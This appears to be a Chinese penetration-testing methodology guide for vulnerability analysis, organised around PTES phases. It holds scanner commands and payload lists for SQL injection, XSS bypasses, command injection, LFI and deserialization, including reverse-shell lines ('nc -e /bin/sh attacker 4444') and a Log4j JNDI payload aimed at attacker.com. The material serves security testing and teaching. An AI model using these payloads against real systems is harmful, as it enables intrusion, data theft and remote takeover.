# Phase 3-4: 威胁建模与漏洞分析

> **PTES 对应阶段**: 威胁建模 (Threat Modeling) + 漏洞分析 (Vulnerability Analysis)
> 
> **MITRE ATT&CK**: Initial Access [TA0001], Execution [TA0002]

## 漏洞扫描方法论

### 自动化漏洞扫描器

**综合扫描器**
```bash
# Nessus
sudo systemctl start nessusd
# Web: https://localhost:8834

# OpenVAS
sudo openvas-start
# Web: https://localhost:9392

# Nuclei (推荐 - 速度快、社区模板丰富)
nuclei -u http://target.com -t nuclei-templates/
nuclei -l urls.txt -t cves/ -o nuclei_output.txt

# Nikto
nikto -h http://target.com -o nikto_result.txt
```

**Web应用扫描**
```bash
# OWASP ZAP
zap-cli quick-scan --self-contained --spider -r http://target.com
# 或 GUI: zap.sh

# Burp Suite Pro Scanner
# 使用 Intruder + Scanner 模块
```

## 手动漏洞检测

### SQL注入 (SQLi)

**检测Payloads**
```sql
-- 报错检测
' OR '1'='1
" OR "1"="1
') OR ('1'='1
") OR ("1"="1

-- 布尔盲注
' AND 1=1--
' AND 1=2--
1' AND 1=1--
1' AND 1=2--

-- 时间盲注
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND IF(1=1,SLEEP(5),0)--
```

**UNION注入**
```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT null,null--

-- 提取数据
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,null FROM information_schema.tables--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

**报错注入**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))--
' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--
```

**工具: SQLMap**
```bash
# 基础检测
sqlmap -u "http://target.com/page.php?id=1" --batch

# POST请求
sqlmap -u "http://target.com/login" --data="user=1&pass=1" --batch

# 数据库操作
sqlmap -u "..." --dbs                    # 列出数据库
sqlmap -u "..." -D dbname --tables       # 列出表
sqlmap -u "..." -D db -T table --dump    # 导出数据

# 获取shell
sqlmap -u "..." --os-shell               # 交互式shell
sqlmap -u "..." --file-read=/etc/passwd  # 读文件
```

### 跨站脚本 (XSS)

**基础Payloads**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

**绕过技巧**
```html
<!-- 编码绕过 -->
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=alert&#x28;1&#x29;>

<!-- 标签分割 -->
<scr<script>ipt>alert(1)</scr<script>ipt>

<!-- 属性注入 -->
" onmouseover="alert(1)
' onclick='alert(1)

<!-- 协议绕过 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**工具: XSStrike**
```bash
python xsstrike.py -u "http://target.com/search?q="
```

### 命令注入

**Linux Payloads**
```bash
; id
| whoami
`cat /etc/passwd`
$(ls -la)

# 空格绕过
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat${IFS}/etc/passwd

# 黑名单绕过
c'a't /etc/passwd
cat /et'c/passw'd
cat /etc/p??swd
```

**Windows Payloads**
```cmd
| whoami
& dir
`type C:\Windows\win.ini`
$(ver)
```

### 路径遍历 / LFI

```
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**伪协议利用**
```
php://filter/read=convert.base64-encode/resource=config.php
php://input (POST data执行)
data://text/plain,<?php system('id'); ?>
expect://id
```

### 反序列化漏洞

**Java (ysoserial)**
```bash
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/sh attacker 4444'
java -jar ysoserial.jar Spring1 'command'
```

**PHP**
```php
# 魔术方法: __destruct, __wakeup
# 工具: PHPGGC
./phpggc Symfony/RCE4 exec 'id'
```

**Python (Pickle)**
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('nc -e /bin/sh attacker 4444',))

payload = base64.b64encode(pickle.dumps(RCE()))
```

## 业务逻辑漏洞

### 常见测试用例

| 漏洞类型 | 测试方法 | 示例 |
|---------|---------|------|
| **价格操纵** | 修改价格参数 | `price=-100` |
| **数量操纵** | 修改数量为负数 | `quantity=-1` |
| **IDOR** | 修改资源ID | `/api/user/123` → `/api/user/124` |
| **批量赋值** | 添加额外字段 | `{"role":"admin"}` |
| **竞态条件** | 并发请求 | 同时提交多个请求 |
| **2FA绕过** | 跳过验证步骤 | 直接访问后续URL |

## 网络服务漏洞

### 常见服务检测

```bash
# 心脏出血 (Heartbleed)
nmap -p443 --script=ssl-heartbleed target.com

# Shellshock
nmap --script=http-shellshock target.com

# SMB漏洞
nmap -p445 --script=smb-vuln-ms17-010 target.com
nmap -p445 --script=smb-vuln-ms08-067 target.com

# MS-SQL
nmap -p1433 --script=ms-sql-info,ms-sql-empty-password target.com
```

## CVE快速检测

### Log4j (CVE-2021-44228)
```bash
# 测试Payload: ${jndi:ldap://attacker.com/exploit}

# 自动扫描
python log4j-scan.py -u http://target.com
```

### 其他高危CVE
```bash
# 使用Nuclei检测特定CVE
nuclei -u target.com -t cves/2021/CVE-2021-44228.yaml
nuclei -u target.com -t cves/2020/
```

## 漏洞优先级评估

### CVSS 评分参考

| 等级 | CVSS | 响应时间 |
|------|------|---------|
| Critical | 9.0-10.0 | 24小时内 |
| High | 7.0-8.9 | 1周内 |
| Medium | 4.0-6.9 | 1月内 |
| Low | 0.1-3.9 | 下次更新 |

### 实际风险评估

**考虑因素**:
1. 利用复杂度 (Exploitability)
2. 影响范围 (Scope)
3. 所需权限 (Privileges Required)
4. 用户交互 (User Interaction)
5. 业务影响 (Business Impact)

## 参考资源

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
